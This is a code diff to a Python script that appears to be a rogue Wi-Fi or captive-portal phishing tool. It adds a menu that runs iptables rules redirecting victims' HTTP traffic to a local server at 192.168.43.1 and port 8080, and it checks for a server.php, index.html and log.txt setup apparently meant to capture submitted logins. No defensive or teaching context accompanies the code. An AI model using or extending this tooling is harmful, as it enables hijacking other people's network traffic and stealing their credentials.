@@ -21,8 +21,32 @@ def run_commands(commands):
     for command in commands:
         os.system(command)
 
-# Function to handle the "Run" option
 def run_option():
+    print(colored("1. Captive\n2. Wifi\n", 'green'))
+    run_input = input("Which one > ")
+    if run_input.lower() == "captive" or run_input == "1":
+        captive_option()
+    elif run_input.lower() == "wifi" or run_input == "2":
+        wifi_option()
+    else:
+        main_menu()
+# Function to handle the "Run" option
+def captive_option():
+    if not os.path.exists("Captive/"):
+     print(colored("Looks like captive.zip not extracted yet\n let me do it for you", 'red'))
+     time.sleep(3)
+     os.system("unzip Captive.zip")
+     main_menu()
+    else:
+        run_commands([
+            "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
+            "iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
+            "iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
+            "iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.43.1",
+            "iptables -P FORWARD DROP"
+        ])
+# Function to handle the "Run" option
+def wifi_option():
     if not os.path.exists("Server/server.php") or not os.path.exists("Server/index.html") or not os.path.exists("Server/log.txt"):
         print(colored("You didn't even compile yet", 'red'))
     else:
